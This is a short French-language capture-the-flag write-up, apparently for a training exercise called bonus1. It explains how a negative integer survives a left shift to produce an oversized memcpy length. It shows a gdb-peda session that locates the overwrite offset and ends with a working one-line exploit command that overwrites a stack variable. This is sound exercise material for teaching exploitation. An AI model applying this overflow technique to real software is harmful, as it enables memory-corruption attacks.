# Bonux 1 

- On voit que dans le code les bit sont decaler de deux pour calculer la taille
- Le premier bit d'un int sert a savoir si il est negatif ou positif
- Donc tout les nombres negatif seront converti en nombre positif
<pre>
[alarmv@alarm Ressources]$ gdb ./bonus1 
gdb-peda$ pattern create 75
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA'
gdb-peda$ disass main
Dump of assembler code for function main:
   <strong>0x08048473</strong> <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
gdb-peda$ b *0x08048478
Breakpoint 1 at 0x8048478
gdb-peda$ r -2147483600 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA'
gdb-peda$ x $esp+0x3c
<strong>0xffffd54c:     "AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA"</strong>
gdb-peda$ pattern offset AA0AAFA
AA0AAFA found at offset: <strong>40</strong>
</pre>
- Il faut donc ecrire 44 caractere dans memcpy se qui fait **101100** en binaire
- Avec `<< 2` il faut que le int soit egale a **10000000000000000000000000001011** se qui fait -2147483637
- Donc on peut executé la commande ci contre
```
./bonus1 -2147483637 $(python -c "print('A' * 40 +  '\x46\x4c\x4f\x57')")
```
